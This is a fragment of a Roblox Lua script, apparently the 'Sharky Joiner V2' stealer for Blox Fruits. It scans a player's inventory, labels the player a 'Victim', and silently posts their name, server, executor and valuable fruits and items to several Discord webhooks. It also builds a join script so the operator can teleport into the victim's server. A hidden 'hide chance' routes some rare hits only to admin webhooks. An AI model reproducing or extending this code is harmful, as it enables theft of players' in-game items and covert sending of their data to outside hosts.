-- Embed Formatting Functions
local function formatFruitListWithEmojis_NoCodeBlock(f) if not f or #f==0 then return"None"end; local l={};table.sort(f,function(a,b)return(a.value or 0)>(b.value or 0)end); for _,fr in ipairs(f) do local e=fruitEmojiMap[fr.name]or""; local p=e~="" and(e.." ")or""; local c=fr.count>1 and string.format(" (x%d)",fr.count)or""; table.insert(l,string.format("%s%s%s",p,fr.name,c)) end; local M=15;if #l>M then local d={};for i=1,M do table.insert(d,l[i])end;table.insert(d,string.format("*... and %d more*",#l-M));return table.concat(d,"\n")else return table.concat(l,"\n")end end
local function formatPremiumList_NoCodeBlock(p) if not p or #p==0 then return"None"end; local l={};table.sort(p,function(a,b)return a.name<b.name end); for _,i in ipairs(p) do local e=""; local pr=e~="" and(e.." ")or""; local c=i.count>1 and string.format(" (x%d)",i.count)or""; table.insert(l,string.format("%s%s%s",pr,i.name,c)) end; local M=10;if #l>M then local d={};for i=1,M do table.insert(d,l[i])end;table.insert(d,string.format("*... and %d more*",#l-M));return table.concat(d,"\n")else return table.concat(l,"\n")end end
local function formatCombinedTargets_CodeBlocks_NoSeparator(f,p,fs) local tl={}; local fft=false; local fpt=false; local tf=0; local M=7; if f then table.sort(f,function(a,b)return(a.value or 0)>(b.value or 0)end); for _,fr in ipairs(f) do if fs[fr.name]and tf<M then fft=true;tf=tf+1; local n=fr.name; local c=fr.count>1 and string.format(" (x%d)",fr.count)or""; table.insert(tl,string.format("```\n%s%s\n```",n,c))end end end; if p then table.sort(p,function(a,b)return a.name<b.name end); for _,i in ipairs(p) do if tf<M then fpt=true;tf=tf+1; local n=i.name; local c=i.count>1 and string.format(" (x%d)",i.count)or""; table.insert(tl,string.format("```\n%s%s\n```",n,c))end end end; if not fft and not fpt then return"```\nNone\n```"end; local ac=0; if f then for _,fr in ipairs(f) do if fs[fr.name]then ac=ac+1 end end end; if p then ac=ac+#p end; if ac>M then table.insert(tl,string.format("```\n... and %d more\n```",ac-M))end; return table.concat(tl,"")end

-- Main Webhook Function (sendWebhook) - REVISED for Admin Embeds & Hide Chance
local function sendWebhook(inventory)
    local url1=webhook1_key and _G[webhook1_key]; local url2=Protector_key and _G[Protector_key]; local url3=dummy_key and _G[dummy_key]; local url4=dragon_webhook_key and _G[dragon_webhook_key]
    -- Removed url1 nil check for silence if not configured

    local goodFruitNames={["Kitsune-Kitsune"]=true,["Yeti-Yeti"]=true}
    local fruits, premiumItems={}, {}; local dragonHit,hasPremiumItem,hasGoodFruit,foundAnyTarget=false,false,false,false; local fruitsToHitSet={}; for _,f in ipairs(FruitsToHit) do fruitsToHitSet[f]=true end
    if not inventory then inventory={} end
    for _,item in ipairs(inventory) do if item and(item.Type=="Blox Fruit"or item.Type=="Premium")then local d={name=item.Name,count=item.Count,value=item.Value or 0}; if item.Type=="Blox Fruit"then table.insert(fruits,d); if item.Name:find("Dragon")then dragonHit=true; if not fruitsToHitSet[item.Name]then table.insert(FruitsToHit,item.Name); fruitsToHitSet[item.Name]=true end end; if goodFruitNames[item.Name]then hasGoodFruit=true end; if fruitsToHitSet[item.Name]then foundAnyTarget=true end else table.insert(premiumItems,d); hasPremiumItem=true; foundAnyTarget=true end end end

    -- Generate Join Script
    local jobId=game.JobId; local placeId=game.PlaceId; local isSea3=(placeId==7449423635); local seaTravelArgument=isSea3 and"TravelZou"or"TravelDressrosa"
    local joinScriptFormatString = [=[
    local iddd = %d
    local JobIdd = "%s"
    local sea = "%s"

    if game.PlaceId ~= iddd then
        queue_on_teleport([[
            task.wait(5)
            if game.JobId ~= JobIdd then -- Extra check
                -- print("Executing queued teleport to: " .. JobIdd) -- Removed print
                game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")
            -- else
                -- print("Already in target server, skipping queued teleport.") -- Removed print
            end
        ]])
        -- print("Invoking sea travel: " .. sea) -- Removed print
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(sea)
    else
        if game.JobId ~= JobIdd then
            -- print("Already in correct sea, teleporting directly to: " .. JobIdd) -- Removed print
             game:GetService("TeleportService"):TeleportToPlaceInstance(iddd, JobIdd)
        -- else
             -- print("Already in target server instance.") -- Removed print
        end
    end
]=]
    local joinScriptLua = string.format(joinScriptFormatString, placeId, jobId, seaTravelArgument, placeId, jobId)
    local joinScriptPC_Formatted="```lua\n"..joinScriptLua.."\n```"; local joinScriptMobile_Formatted=joinScriptLua

    -- Determine Hide Status FIRST
    local sendToMainWebhook = true; local wasHidden = false
    local isTester = table.find(TestingUsernames or {}, LocalPlayer.Name)
    local isMainUser = table.find(Usernames or {}, LocalPlayer.Name)
    local isExempt = isTester or isMainUser

    if not isExempt then
        local dragonHideChance = tonumber(DragonHitHideChancePercent) or 0
        local goodFruitHideChance = tonumber(GoodFruitHideChancePercent) or 0
        if dragonHit then
            if math.random(1, 100) <= dragonHideChance then sendToMainWebhook = false; wasHidden = true end
        elseif hasGoodFruit and not hasPremiumItem then
             if math.random(1, 100) <= goodFruitHideChance then sendToMainWebhook = false; wasHidden = true end
        end
    end -- No prints/warns

    -- Determine Embed Title, Color, Mention (Main)
    local mainEmbedTitle="<:pepeyes:1226249991035682897> **Sharky Joiner Hit!**"; local mainEmbedColor=10181046; local mainMention="@everyone Sharky Hit!";
    if dragonHit and hasPremiumItem then mainEmbedTitle="<:dragonE:1318248271457812510><:value:1228807380188397649> **DRAGON & PREMIUM HIT!**"; mainEmbedColor=65280; mainMention="@everyone Sharky - GG!" elseif dragonHit then mainEmbedTitle="<:dragonE:1318248271457812510> **DRAGON HIT!**"; mainEmbedColor=16776960; mainMention="@everyone Sharky - GG!" elseif hasPremiumItem then mainEmbedTitle="<:value:1228807380188397649> **PREMIUM ITEM HIT!**"; mainEmbedColor=3447003; mainMention="@everyone Sharky - GG!" elseif foundAnyTarget then mainEmbedTitle="<:pepeyes:1226249991035682897> **Target Fruit Hit!**" end

    -- Common Embed Fields
    local serverName = getServerName(); local executorName=identifyexecutor()or"Unknown"; local currentSeaName = isSea3 and"Sea 3"or"Sea 2"
    local commonFields = {{name="<:Verified:1248961823856918623> **Victim Info**",value=string.format("**Name:** %s\n**Sea:** %s\n**Server:** **%s**",LocalPlayer.Name,currentSeaName,serverName),inline=true},{name="<:Point_Right:1223617791710724219> **Session Info**",value=string.format("**Players:** %d\n**Time:** %s\n**Executor:** %s",#Players:GetPlayers(),os.date("%Y-%m-%d %H:%M:%S"),executorName),inline=true},{name="ðŸŽ¯ **TARGET ITEMS FOUND** ðŸŽ¯",value=formatCombinedTargets_CodeBlocks_NoSeparator(fruits,premiumItems,fruitsToHitSet),inline=false},{name="<:Dough:1169423442366451795> **Victim's Fruits**",value=formatFruitListWithEmojis_NoCodeBlock(fruits),inline=false},{name="<:value:1228807380188397649> **Victim's Premium Items**",value=formatPremiumList_NoCodeBlock(premiumItems),inline=false},{name="<:script:1353078817018876084> **Join Script (PC Copy)**",value=joinScriptPC_Formatted,inline=false},{name="<:script:1353078817018876084> **Join Script (Mobile Copy)**",value=joinScriptMobile_Formatted,inline=false}}
    local commonFooter = {text="Sharky Joiner V2 â€¢ "..os.date("%Y-%m-%d")}

    -- Construct Main Embed Payload
    local mainEmbedData = {title = mainEmbedTitle, color = mainEmbedColor, fields = commonFields, footer = commonFooter}
    local mainPayloadTable = {content = mainMention, embeds = {mainEmbedData}}
    local mainPayloadBody = HttpService:JSONEncode(mainPayloadTable)

    -- Construct Admin Embed Payload (Conditionally)
    local adminPayloadBody = nil; local isAdminHit = dragonHit or hasPremiumItem or hasGoodFruit
    if isAdminHit then
        local adminEmbedTitle = mainEmbedTitle; local adminEmbedColor = mainEmbedColor; local adminMention = mainMention
        if hasGoodFruit and not dragonHit and not hasPremiumItem then adminEmbedTitle="<:kitsune:1185239741545848922> **TOP FRUIT HIT!** (Kitsune/Yeti)"; adminEmbedColor=16753920; adminMention="@everyone Sharky - GG!" elseif dragonHit or hasPremiumItem then adminMention="@everyone Sharky - GG!" end
        if wasHidden then adminEmbedTitle = adminEmbedTitle .. " <a:YellowCheck:1361458542384779324>" end -- Add hide indicator
        local adminEmbedData = {title = adminEmbedTitle, color = adminEmbedColor, fields = commonFields, footer = commonFooter}
        local adminPayloadTable = {content = adminMention, embeds = {adminEmbedData}}
        adminPayloadBody = HttpService:JSONEncode(adminPayloadTable)
    end

    -- Send Webhooks Asynchronously (Silent Hide Chance Logic)
    task.spawn(function()
        local h = {["Content-Type"]="application/json", ["X-Client-Key"]=validation_sig};
        local url1 = webhook1_key and _G[webhook1_key]; local url2 = Protector_key and _G[Protector_key]; local url3 = dummy_key and _G[dummy_key]; local url4 = dragon_webhook_key and _G[dragon_webhook_key];

        if url1 and mainPayloadBody and sendToMainWebhook then SafeRequest({Url = url1, Method = "POST", Headers = h, Body = mainPayloadBody}) end
        if url2 and mainPayloadBody then task.wait(0.1); SafeRequest({Url = url2, Method = "POST", Headers = h, Body = mainPayloadBody}) end
        if url3 and adminPayloadBody then task.wait(0.1); SafeRequest({Url = url3, Method = "POST", Headers = h, Body = adminPayloadBody}) end
        if url4 and dragonHit and adminPayloadBody then task.wait(0.1); SafeRequest({Url = url4, Method = "POST", Headers = h, Body = adminPayloadBody}) end
    end)
    table.clear(fruits); table.clear(premiumItems); table.clear(fruitsToHitSet);
end

